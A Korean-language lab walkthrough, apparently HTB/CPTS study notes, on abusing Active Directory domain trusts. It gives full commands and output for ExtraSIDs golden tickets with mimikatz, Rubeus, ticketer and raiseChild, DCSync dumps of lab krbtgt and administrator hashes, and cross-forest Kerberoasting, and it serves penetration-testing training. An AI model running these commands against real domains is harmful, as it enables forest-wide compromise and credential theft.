---
title: "Active Directory - Domain Trusts and Cross-Domain Attacks"
date: 2026-08-09
layout: single
excerpt: "Active Directory 환경에서 도메인 및 포레스트 신뢰 관계를 열거하고, ExtraSID를 이용한 Child-to-Parent 공격과 Cross-Forest Kerberoasting, Foreign Group Membership 악용 흐름을 실습한다."
author_profile: true
toc: true
toc_label: "Active Directory"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [cpts, active-directory, extra-sid, domain-trusts, cross-forest]
---

Active Directory 환경에서 도메인 및 포레스트 신뢰 관계를 열거하고, ExtraSID를 이용한 Child-to-Parent 공격과 Cross-Forest Kerberoasting, Foreign Group Membership 악용 흐름을 실습한다.

# Why So Trusting?

## Domain Trusts Primer

AD 환경에서는 조직 확장, 인수합병, 서비스 분리 등의 이유로 서로 다른 도메인이나 포리스트가 함께 운영되는 경우가 있다.

모든 AD 객체를 하나의 도메인으로 이전하지 않고도 인증과 자원 접근 경로를 연결하기 위해 Domain Trust(도메인 신뢰 관계)를 사용할 수 있다.

Trust를 이해할 때는 신뢰 방향(Direction), 전이성(Transitivity), 그리고 동일 포리스트인지 별도 포리스트인지 구분해서 보는 것이 중요하다.

### Transitive and Non-Transitive Trusts

다음과 같이 연쇄적인 신뢰 관계가 구성되어 있다고 가정해 보자:

```text
Domain A
   ↓ Trust
Domain B
   ↓ Trust
Domain C
```

여러 도메인이 연쇄적으로 연결되어 있을 때 신뢰 관계가 다음 도메인까지 전파될 수 있다면 Transitive Trust라고 한다.

예를 들어 A가 B를 신뢰하고 B가 C를 신뢰하며 해당 Trust가 전이 가능하다면, A와 C 사이에도 신뢰 경로가 형성될 수 있다:

```text
A → B → C
```

반대로 Non-Transitive Trust는 직접 설정된 두 도메인 사이에서만 신뢰가 유효하며, 중간 도메인을 거쳐 자동으로 확장되지 않는다:

```text
A ↔ B ↔ C

A ↛  C
```

Trust에는 방향도 존재한다. 이때 중요한 점은 **Trusting Domain이 Trusted Domain의 사용자를 신뢰**한다는 것이다.

개념적으로 다음과 같이 볼 수 있다:

```text
Trusted Domain
     │ user authentication
     ▼
Trusting Domain
```

즉 Trusted Domain의 사용자는 Trusting Domain 쪽에서 인증될 수 있으며, 실제 리소스 접근 여부는 대상 리소스의 ACL과 그룹 권한에 따라 결정된다.

예를 들어 다음과 같이 `A trusts B` 인 One-way Trust가 존재한다고 가정해보자:

```text
A trusts B
```

이 경우 A가 Trusting Domain이고 B가 Trusted Domain이므로, 인증 방향은 `B 사용자 → A 리소스` 가 된다. 반대 방향은 별도의 Trust가 없으면 성립하지 않는다.

Bidirectional Trust는 두 도메인이 서로를 신뢰하여 양쪽 방향의 인증 경로가 존재한다는 의미이다.

### Enumerating Domain Trusts

현재 도메인에서 `Get-ADTrust` 를 사용하면 연결된 Trust의 방향과 속성을 확인할 수 있다:

```powershell
PS C:\Users\htb-student> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

첫 번째 결과에서 `LOGISTICS.INLANEFREIGHT.LOCAL` 은 I`ntraForest : True` 이므로 `INLANEFREIGHT.LOCAL` 과 같은 포리스트 안에 있는 도메인이다.

이 환경에서는 이름 구조와 `WITHIN_FOREST` Trust 속성을 기준으로 `LOGISTICS.INLANEFREIGHT.LOCAL` 을 Child Domain으로 볼 수 있다. 

즉 별도의 자식 포리스트가 아니라 같은 포리스트 내부의 자식 도메인이다.

또한 다음 값으로 양방향 Trust임을 확인할 수 있다:

```text
Direction : BiDirectional
```

`BiDirectional` 은 두 도메인 사이에 양쪽 방향의 인증 경로가 있다는 뜻이며, 실제 접근 권한은 각 도메인의 그룹 멤버십과 ACL에 의해 별도로 결정된다.

두 번째 결과의 `FREIGHTLOGISTICS.LOCAL` 은 `IntraForest : False` 이므로 현재 포리스트와는 별도의 포리스트이다.

동시에 `ForestTransitive : True` 이므로 두 포리스트 사이에 Forest Trust가 구성되어 있고, 포리스트 내부의 도메인들까지 Trust 경로가 전이될 수 있다.

이 관계 역시 다음과 같이 양방향으로 설정되어 있다:

```text
Direction : BiDirectional
```

따라서 양쪽 포리스트의 사용자는 Trust를 통해 상대 포리스트에서 인증될 수 있지만, 대상 리소스에 대한 실제 권한은 별도로 필요하다.

PowerView의 `Get-DomainTrustMapping` 을 사용하면 이러한 Trust 관계를 한 번에 매핑할 수 있다:

```powershell
PS C:\Users\htb-student> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : FREIGHTLOGISTICS.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:08 PM
WhenChanged     : 2/27/2022 12:02:41 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM
```

## Attacking Domain Trusts - Child → Parent Trusts - from Windows

### Extracting the Child Domain KRBTGT Hash

이 시나리오는 Child Domain인 `LOGISTICS.INLANEFREIGHT.LOCAL` 의 Domain Admin 수준 권한을 확보한 상태에서 시작한다.

Child Domain의 `krbtgt` 비밀값을 확보하면 해당 도메인의 Kerberos TGT를 위조할 수 있으므로, 먼저 DCSync를 통해 `krbtgt` 의 NTLM 해시를 가져왔다:

```powershell
PS C:\Windows\system32> .\mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt /domain:LOGISTICS.INLANEFREIGHT.LOCAL" exit

mimikatz(commandline) # lsadump::dcsync /user:LOGISTICS\krbtgt /domain:LOGISTICS.INLANEFREIGHT.LOCAL

[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/01/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

이처럼 Child Domain의 `krbtgt` NTLM 해시 `9d765b482771505cbe97411065964d5f` 를 확보하였다.

### Identifying the Child and Root Domain SIDs

다음으로 PowerView를 사용해 현재 Child Domain의 SID를 확인하였다:

```powershell
PS C:\Windows\system32> get-domainsid

S-1-5-21-2806153819-209893948-922872689
```

현재 Child Domain `LOGISTICS.INLANEFREIGHT.LOCAL` 의 Domain SID는 `S-1-5-21-2806153819-209893948-922872689` 이다.

`Child → Parent` 공격에서 필요한 핵심 값 중 하나는 Forest Root Domain의 `Enterprise Admins SID` 이다.

`Enterprise Admins` 는 Forest Root Domain에 존재하는 Universal Group이며 RID가 `519` 이다. 

다음 명령으로 실제 SID를 확인하였다:

```powershell
PS C:\Windows\system32> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

이처럼 `Enterprise Admins` 의 SID는 다음과 같다:

```text
S-1-5-21-3842939050-3880317879-2865463114-519
```

`Enterprise Admins` 는 Forest Root Domain에 존재하며 기본적으로 포리스트 전체에서 매우 높은 관리 권한을 갖는 그룹이다.

이 그룹의 권한이 적용되는 환경에서는 다음과 같은 고권한 작업으로 이어질 수 있다:

```text
사용자/그룹 관리
AD 객체 및 ACL 관리
관리 그룹 membership 관리
DC 관리
GPO 등 고권한 AD 구성 관리
Directory replication 권한을 통한 작업
```

앞에서 확인한 Child Domain과 Root Domain은 같은 포리스트 내부의 Trust 관계를 가진다. 

여기서 핵심은 Child Domain의 `krbtgt` 키가 탈취되었다는 점이다. 

공격자는 Child Domain이 서명한 TGT의 PAC에 Root Domain의 `Enterprise Admins` SID를 ExtraSID로 삽입해 권한 정보를 위조할 수 있다.

이 기법은 같은 포리스트 내부의 Child → Parent 공격에서 흔히 **ExtraSIDs Attack** 또는 **SID History Injection을 이용한 Golden Ticket 공격**으로 설명된다.

### Forging a Golden Ticket with ExtraSIDs

Rubeus를 사용해 Child Domain의 `krbtgt` 해시로 Golden Ticket을 로컬에서 위조하고, `/sids` 에 Root Domain의 `Enterprise Admins` SID를 추가한 뒤 현재 로그온 세션에 주입하였다:

```powershell
PS C:\Windows\system32> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

# SKIP

[*] base64(ticket.kirbi):
      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG
      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M
      T0NBTKOCBD.....

[+] Ticket successfully imported!
```

티켓을 주입한 뒤 `klist` 를 확인하면 `hacker@LOGISTICS.INLANEFREIGHT.LOCAL` 클라이언트 정보가 포함된 Child Domain TGT가 캐시에 들어간 것을 확인할 수 있다:

```powershell
PS C:\Windows\system32> klist

Current LogonId is 0:0x763ec

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 8/09/2026 10:03:16 (local)
        End Time:   8/09/2026 20:03:16 (local)
        Renew Time: 8/16/2026 10:03:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

개념적으로 위조된 티켓의 핵심 정보는 다음과 같이 정리할 수 있다:

```text
User = hacker
Domain = LOGISTICS.INLANEFREIGHT.LOCAL
SID = S-1-5-21-2806153819-209893948-922872689
ExtraSID = S-1-5-21-3842939050-3880317879-2865463114-519
```

이 티켓의 PAC에는 Child Domain 사용자 SID와 함께 Root Domain의 `Enterprise Admins` SID가 ExtraSID로 포함되어 있다. 

같은 포리스트 내부에서 해당 권한 정보가 신뢰되면 Root Domain 서비스에 대한 고권한 인증으로 이어질 수 있다.

### DCSync Against the Parent Domain

주입한 티켓을 이용해 Root Domain의 `Administrator` 계정을 대상으로 DCSync를 시도하였다:

```powershell
PS C:\Windows\system32> .\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\administrator /domain:INLANEFREIGHT.LOCAL" exit

mimikatz(commandline) # lsadump::dcsync /user:INLANEFREIGHT\administrator /domain:INLANEFREIGHT.LOCAL

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 7:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
```

이처럼 위조된 ExtraSIDs Golden Ticket을 이용해 Root Domain에서 `Administrator` 의 NTLM 해시를 DCSync로 가져오는 데 성공하였다.

## Attacking Domain Trusts - Child -> Parent Trusts - from Linux

### Collecting the Child Domain Trust Material

Linux에서도 동일한 Child → Parent ExtraSIDs 공격 흐름을 구성할 수 있다.

먼저 Impacket의 `secretsdump.py` 를 사용하여 Child Domain의 `krbtgt` 해시를 DCSync로 가져왔다:

```bash
$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt     

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca2
```

각 도메인의 SID와 주요 RID를 확인하기 위해 `lookupsid.py` 를 사용할 수 있다:

```bash
$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 

[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
500: LOGISTICS\Administrator (SidTypeUser)
501: LOGISTICS\Guest (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
512: LOGISTICS\Domain Admins (SidTypeGroup)

# SKIP
```

현재 Child Domain SID가 `S-1-5-21-2806153819-209893948-922872689` 임을 확인할 수 있다.

다음으로 Root Domain의 SID와 `Enterprise Admins` RID를 확인하였다:

```bash
$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

`Enterprise Admins` 의 RID는 `519` 이므로 Root Domain SID 뒤에 `-519` 를 붙이면 전체 SID를 구성할 수 있다:

```text
S-1-5-21-3842939050-3880317879-2865463114-519
```

### Forging and Using an ExtraSIDs Ticket

필요한 값들을 모두 확보했으므로 `ticketer.py` 를 이용해 Child Domain Golden Ticket을 로컬에서 위조하였다. `-extra-sid` 에는 Root Domain의 Enterprise Admins SID를 지정한다:

```bash
$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in hacker.ccache
```

생성된 `hacker.ccache` 를 Kerberos 캐시로 사용하도록 `KRB5CCNAME` 환경 변수를 설정하였다:

```bash
$ export KRB5CCNAME=$(pwd)/hacker.ccache
```

`klist` 를 확인하면 위조된 Child Domain TGT가 현재 Kerberos 캐시로 설정된 것을 확인할 수 있다:

```bash
$ klist

Ticket cache: FILE:/home/htb-student/hacker.ccache
Default principal: hacker@LOGISTICS.INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
08/09/2026 13:32:56  08/06/2036 13:32:56  krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL@LOGISTICS.INLANEFREIGHT.LOCAL
        renew until 08/06/2036 13:32:56
```

이후 해당 Kerberos 캐시를 사용하여 Root Domain의 `Administrator` 계정을 대상으로 DCSync를 수행하였다:

```bash
$ secretsdump.py -k -no-pass -just-dc-user INLANEFREIGHT/Administrator -target-ip 172.16.5.5 'LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local'

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
```

### Automating with raiseChild

`raiseChild.py` 는 Child Domain 관리자 수준의 자격 증명을 바탕으로 Child Domain `krbtgt` 정보, Root Domain의 `Enterprise Admins` SID 등을 수집하고 Child → Parent 권한 상승 과정을 자동화하는 Impacket 도구이다:

```bash
$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file BnEGssCE.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service UVNb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

# Breaking Down Boundaries

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

이번에는 같은 포리스트 내부가 아니라 서로 다른 포리스트 사이의 Trust를 살펴본다.

다른 포리스트에서 Inbound Trust 또는 Bidirectional Forest Trust가 존재하면 상대 포리스트의 사용자가 인증될 수 있는 경로가 생기므로, 추가적인 공격 표면이 존재할 수 있다.

다만 Cross-Forest Trust에서는 일반적으로 SID Filtering이 적용되므로, 앞에서 사용한 같은 포리스트의 Child → Parent ExtraSIDs 공격을 그대로 재사용하는 것과는 다르다.

앞서 확인한 `FREIGHTLOGISTICS.LOCAL` 은 별도의 포리스트이며 `BiDirectional` 과 `ForestTransitive` 가 활성화되어 있다:

```text
Direction               : BiDirectional
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
```

이는 두 포리스트의 KDC가 Forest Trust를 통해 상대 포리스트로 Kerberos referral 경로를 제공할 수 있다는 의미이다. 

실제 리소스 접근 권한은 대상 포리스트의 ACL과 그룹 멤버십에 의해 결정된다.

### Cross-Forest Kerberoasting

먼저 PowerView를 사용해 `FREIGHTLOGISTICS.LOCAL` 에서 SPN이 설정된 사용자 계정을 확인하였다:

```powershell
PS C:\Users\htb-student> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------

krbtgt
mssqlsvc
sapssso
```

`krbtgt` 를 제외하면 `mssqlsvc`, `sapssso` 와 같은 서비스 계정이 확인된다. 

Trust를 통해 해당 포리스트의 SPN에 대한 서비스 티켓을 요청할 수 있다면 Kerberoasting을 시도할 수 있다.

Rubeus를 사용해 `FREIGHTLOGISTICS.LOCAL` 의 `mssqlsvc` 계정에 대한 TGS를 요청하고 오프라인 크랙용 `$krb5tgs$` 형식으로 추출하였다:

```powershell
PS C:\Users\htb-student> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$4609EDA05A08AA8F3120CC11901D1346$E310CEB8F94BAAE3B93A21FB2C7822BD7E5CEAA30D9F43994F9031F84AAAF07812C72F5AC3BBAD2B9A597141788ED16FC5875DF15C3C5AF333C2BF787705110E4BA01C5C4003B9D96F922129233CE1E0A93B8873D02F4439505112DA5C4BB430D907931DC34BE93E96094805DACF5CC13C3FA93CD8B67E33651BD0361C2AF70D77C7544BB91BC2B7854BAD3CC8977D2622978CD78531B6F8CE9D0E333B626DBA1F54F35D75AA38D91902C0774379965532FA3557E757A3D891771636B0B57BA1B59E7BCBC121480E9E5A7BBB64846E68D2E1FAB33F664027E2BCBFC367C7D50A9CE66DD876434D3363FF8E32BCC96F8197A2F0B2D26D2CA9E1D6B404E315516C290EF9F8A793A2E07F3F537C3B3EAF9B685D91BC23441F8C2054EE1825A4501666179A63C918C4D3174C6F382A7454B0E47BE7F3C27A84583158ADAFC804531FAE423A0FAF6E31575D95EFE0A8A5E78FECBE616D82B867FE3BF402BEA77FFA7140FC7B1EAFBE55B7413A16725931A76248D7E1F300D2E50E57A4EE561C5C0D8E31FAE596946F9DA59AC83617A46B990EEFF64D0C85395655679A26E7AB6B1918CFC6730E41766D2866E89A62C2AEE53A3A13A7074C1F4CAFEFBBA8BCB7842E1983FBD90FB58E0E84A8AC6F94609ED993643A5AD49B1C643AE2765ED481233F57E2D7D0C96F6F89FF23FE2F987DAE65945C5E2773002271CA50FEC1B0D07E7EDBFFEE971BF3F46B3FF64E711F020CD60BA806B071A6A5864DD58557F098455E3A9A35C2836FD75C1D7330F8B35DE96302A664920B878FBDF7933F78C005D6DB34BA843866A4A94D26F3B2AA1BD721C481EECAC9B9DBA36E6182B7D1AC1F840CC66B9C51FAD77FCC44C4140121CB69925C4D265840710ACFE0C91BE677C4A0A233E932F6D92F73A6110356C85A0FDCCE2F2FF19DB0B34AD4B2440AD7F5A8CF8E340C982B2D9CF8F041D38715A7CBB553BC486B51D070540D79A26125A2D2D18D6D9D7D925810E3BB64DE4AB0BD83BDB961227E16F8AB88272059F1EF02275C2505C82C98517E3A0BE2A3EE0B95A514A24264A474BCA1A2196A63E136429E17E78BC2BEB55936108FF3FE3D8F1F817A3FD7026B34A4227B57D2ADFEEEC049C9ECD106502BB429F62EE7C46FB658737F1E551B9434B9827E23DEF8A1B6DAEA9F35C1327BE01B9FC40E2E8C45FC50BB009A786CD7BADEB028B06CC1A67F6B63C126ACB0C85FB6D0B590443431E8C725D03E96584D5365CD80F6D7136CB28128B7D36B4523D42B7BF9A8F6B52FF1727C306ED8B44C881EEBD456415923692D814DF9770978D5526D88305827DD6B90AF581319A3CF3F3C4899276F196DBC12DEF4839F64FA1C7712D7C0AAC768B17556E00D5D956D591BC2164D8925303B8F7826880B063A099BB4A7155284FD5A4B75FF30D8C5BB8A791E60A83A9CEADFEB1F671765FFF71421FFB3010C86EE7A98CE013FA13B1AD7E5F85F02F01834491D63A8A112B3067C9F686B5C3C5F3A218EF281736F754EF38C5BEF7BB59C2546F8923500C3054C724C7C4983F4B3AF0C33913003A4C9C6F52A22DD2AE56726F47AF75A4AF13CC0DC171A645CC30C83CC8498A3AF1F50FDC45EB61144849DD9992D9CC26EBB6B8422466C9D84FF15D27A255AE69BEA6678A4DE0377FD6541
```

이후 추출한 TGS 데이터를 Hashcat과 같은 도구로 오프라인 크랙할 수 있다.

### Foreign Security Principals and Cross-Forest Access

Cross-Forest Trust에서는 상대 포리스트의 계정이 대상 포리스트의 Domain Local Group 등에 명시적으로 추가되어 있는지도 중요한 공격 경로가 된다.

PowerView의 `Get-DomainForeignGroupMember` 를 사용하여 `FREIGHTLOGISTICS.LOCAL` 에 등록된 외부 포리스트 멤버를 확인하였다:

```powershell
PS C:\Windows\system32> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL
```

